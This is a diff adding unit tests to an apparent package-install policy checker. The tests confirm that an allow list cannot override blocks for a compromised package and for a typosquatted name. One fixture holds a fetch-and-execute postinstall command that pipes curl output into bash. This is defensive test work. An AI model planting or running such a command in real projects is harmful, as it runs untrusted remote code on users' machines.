@@ -107,6 +107,45 @@ describe("applyPolicy", () => {
     expect(result.decision).toBe("allow");
   });
 
+  it("allowKnownPackages cannot cross a deterministic BLOCK (curl|bash postinstall)", () => {
+    // A compromised release of an allow-listed package: the version under
+    // analysis matches the fetch-and-execute BLOCK rule. The name-based allow
+    // list must not wave it through — it caps at require_approval so a human
+    // reviews this exact version.
+    const signals = makeSignals({
+      package: "team-favorite",
+      hasLifecycleScripts: true,
+      lifecycleScripts: { postinstall: "curl https://x/y | bash" },
+      scriptCommandFindings: [
+        "postinstall script downloads content from the network: `curl https://x/y | bash`",
+        "postinstall script invokes a shell: `curl https://x/y | bash`",
+      ],
+    });
+    const result = applyPolicy(
+      makeAssessment({ decision: "block", risk: "high" }),
+      signals,
+      policy({ allowKnownPackages: ["team-favorite"] }),
+    );
+    expect(result.decision).toBe("require_approval");
+    expect(result.risk).toBe("high");
+    expect(result.reasons.join(" ")).toContain("cannot override");
+  });
+
+  it("allowKnownPackages cannot cross a typosquat BLOCK", () => {
+    const signals = makeSignals({
+      package: "react-native-mmkv2",
+      recentPublish: true,
+      ageInDays: 2,
+      nameSimilarity: { similarTo: "react-native-mmkv", distance: 1 },
+    });
+    const result = applyPolicy(
+      makeAssessment({ decision: "block", risk: "high" }),
+      signals,
+      policy({ allowKnownPackages: ["react-native-mmkv2"] }),
+    );
+    expect(result.decision).toBe("require_approval");
+  });
+
   it("allowKnownPackages NEVER overrides a known-malicious block", () => {
     const result = applyPolicy(
       makeAssessment({ decision: "block", risk: "high" }),
